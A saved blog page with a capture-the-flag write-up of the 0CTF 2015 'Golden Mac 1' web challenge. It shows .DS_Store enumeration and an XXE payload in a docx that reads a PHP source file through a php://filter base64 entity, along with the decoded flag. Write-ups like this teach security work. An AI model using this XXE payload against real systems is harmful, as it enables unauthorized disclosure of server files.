@@ -1,0 +1,264 @@
+
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>0CTF 2015 - Golden Mac 1 (web 300)</title>
+    <meta name="description" content="">
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="shortcut icon" href="../../../../../assets/favicon.png?v=d47df0f104">
+
+    <link rel="stylesheet" type="text/css" href="../../../../../assets/css/screen.css?v=d47df0f104">
+    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
+    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">
+
+    <script type="text/javascript" src="../../../../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../../../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../../../../assets/js/moment.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../../../../assets/js/handlebars.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../../../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
+    <script type="text/javascript" src="../../../../../assets/js/index.js?v=d47df0f104"></script>
+
+
+    <link rel="canonical" href="http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="amphtml" href="http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/amp/">
+    
+    <meta property="og:site_name" content="&lt;/pwntester&gt;">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="0CTF 2015 - Golden Mac 1 (web 300)">
+    <meta property="og:description" content="In the description and task title, it states that the developer uses a Mac Book Pro. So we looked for the .DS_Store in the application root directory and found one whose contents we can read with this simple python script: from ds_store import DSStore   with DSStore.open('DS_">
+    <meta property="og:url" content="http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/">
+    <meta property="article:published_time" content="2015-03-30T17:26:04.000Z">
+    <meta property="article:modified_time" content="2015-03-30T22:16:58.000Z">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="0CTF 2015 - Golden Mac 1 (web 300)">
+    <meta name="twitter:description" content="In the description and task title, it states that the developer uses a Mac Book Pro. So we looked for the .DS_Store in the application root directory and found one whose contents we can read with this simple python script: from ds_store import DSStore   with DSStore.open('DS_">
+    <meta name="twitter:url" content="http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="pwntester">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "&lt;/pwntester&gt;",
+        "logo": "http://www.pwntester.com/content/images/2014/May/rooted.jpeg"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "pwntester",
+        "image": {
+            "@type": "ImageObject",
+            "url": "//www.gravatar.com/avatar/d195407e71e25241001971f9fa5cca45?d=404",
+            "width": 80,
+            "height": 80
+        },
+        "url": "http://www.pwntester.com/author/pwntester/",
+        "sameAs": []
+    },
+    "headline": "0CTF 2015 - Golden Mac 1 (web 300)",
+    "url": "http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/",
+    "datePublished": "2015-03-30T17:26:04.000Z",
+    "dateModified": "2015-03-30T22:16:58.000Z",
+    "description": "In the description and task title, it states that the developer uses a Mac Book Pro. So we looked for the .DS_Store in the application root directory and found one whose contents we can read with this simple python script: from ds_store import DSStore   with DSStore.open(&#x27;DS_",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://www.pwntester.com"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 0.11">
+    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">
+
+    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="../../../../../assets/css/prism.css?v=d47df0f104">
+
+    <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-49973078-2', 'pwntester.com');
+  ga('send', 'pageview');
+
+</script></head>
+
+<body class="post-template">
+
+    <div id="sidebar">
+        <div id="sidebar-content" class="inner">
+            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../../../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
+            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
+            <h3 class="blog-description"></h3></h2>
+
+            <!--form id="search">
+                <input id="search-field" placeholder="Search"/>
+            </form-->
+            <form id="search">  
+                <input id="search-field" type="search" placeholder="Search">
+            </form>  
+
+            <div id="sidebar-links">
+                <ul id="subscription-links">
+                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
+                    <!-- No support yet
+                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
+                    -->
+                </ul>
+                <ul id="sidebar-internal">
+                    <!-- For 'About' and other pages -->
+                </ul>
+                <ul id="sidebar-external">
+                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
+<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
+<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
+<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
+                </ul>
+            </div>
+
+            <footer class="site-footer">
+                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
+            </footer>
+        </div>
+    </div>
+
+    <main>
+        <section id="results"></section>
+        
+
+<article class="post">
+
+
+        <span class="post-meta"><time datetime="2015-03-30">30 Mar 2015</time> </span>
+
+        <h1 class="post-title">0CTF 2015 - Golden Mac 1 (web 300)</h1>
+
+        <section class="post-content">
+            <p><img src="../../../../../content/images/2015/Mar/Screen-Shot-2015-03-30-at-15-58-48.png" alt="Home">
+In the description and task title, it states that the developer uses a Mac Book Pro. So we looked for the <code>.DS_Store</code> in the application root directory and found one whose contents we can read with this simple python script:</p>
+
+<pre><code class="language-lang-python line-numbers">from ds_store import DSStore  
+with DSStore.open('DS_Store', 'r+') as d:  
+    for i in d:
+        print i
+</code></pre>
+
+<p>Output:</p>
+
+<pre><code class="language-lang-raw">&lt;index.php Iloc&gt;  
+&lt;parse.class.php Iloc&gt;  
+&lt;u_can_not_guess_this_haha.php Iloc&gt;  
+</code></pre>
+
+<p>It seems the flag is in <code>u_can_not_guess_this_haha.php</code> but the page renders an empty page. Probably flag is in the code.</p>
+
+<p>The site lets us upload an image and a document. There is no control of the file type nor the extension for the image so we can upload any file to <code>/uploads</code> but that doesnt turn out to be very useful.</p>
+
+<p>We can also upload profile descriptions in <code>docx</code> format which is basically a bunch of XML docs zipped. It turns out the application process the XML files without disabling external entities and so its vulnerable to XXE. We prepared a specially crafted docx document to retrieve the <code>u_can_not_guess_this_haha.php</code> file in base64 format (so we have no problems with <code>&lt;&gt;</code> characters:</p>
+
+<pre><code class="language-lang-raw">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;  
+&lt;!DOCTYPE document [&lt;!ENTITY xxx SYSTEM "php://filter/read=convert.base64-encode/resource=u_can_not_guess_this_haha.php"&gt;]&gt;  
+&lt;w:document&gt; ... &lt;/w:document&gt;  
+</code></pre>
+
+<p>Output:  </p>
+
+<pre><code class="language-lang-raw">PD9waHAgLy9mbGFnIDBjdGZ7eTB1X2ZpbmRfbTNfQmFkX2d1WX0=&lt;br /&gt;  
+</code></pre>
+
+<p>FLAG is: <code>0ctf{y0u_find_m3_Bad_guY}</code></p>
+        </section>
+
+        <footer class="post-footer">
+
+            <section class="author">
+                <div class="author-image">
+                     <img src="http://www.gravatar.com/avatar/d195407e71e25241001971f9fa5cca45?d=404" alt="pwntester"> 
+                </div>
+                <div class="author-text">
+                    <h4>pwntester</h4>
+                    <p></p>
+                    <div class="author-meta clearfix">
+                        
+                        
+                    </div>
+                </div>
+            </section>
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <div class="share-icons">
+                    <a class="fa fa-twitter-square" href="https://twitter.com/share?text=0CTF%202015%20-%20Golden%20Mac%201%20(web%20300)&amp;url=http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                        <span class="hidden">Twitter</span>
+                    </a>
+                    <a class="fa fa-facebook-square" href="https://www.facebook.com/sharer/sharer.php?u=http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                        <span class="hidden">Facebook</span>
+                    </a>
+                    <a class="fa fa-google-plus-square" href="https://plus.google.com/share?url=http://www.pwntester.com/blog/2015/03/30/0ctf-2015-golden-mac-1-web-300/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                        <span class="hidden">Google+</span>
+                    </a>
+                </div>
+            </section>
+
+        </footer>
+
+        <section class="post-comments">
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+                var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
+                /* * * DON'T EDIT BELOW THIS LINE * * */
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </section>
+
+
+</article>
+    </main>
+
+    <!-- You can safely delete this line if your theme does not require jQuery -->
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+
+    <script src="../../../../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
+    <script data-no-instant>InstantClick.init();</script>
+    <script data-no-instant>
+        InstantClick.on('change', function() {
+            prism_markdown();
+            Prism.highlightAll();
+        });
+        InstantClick.init();
+    </script>
+
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function () {
+            var s = document.createElement('script'); s.async = true;
+            s.type = 'text/javascript';
+            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+        }());
+    </script>
+
+    <script type="text/javascript" src="../../../../../assets/js/prism-loader.js?v=d47df0f104"></script>
+    <script type="text/javascript" src="../../../../../assets/js/prism.js?v=d47df0f104"></script>
+
+</body>
+
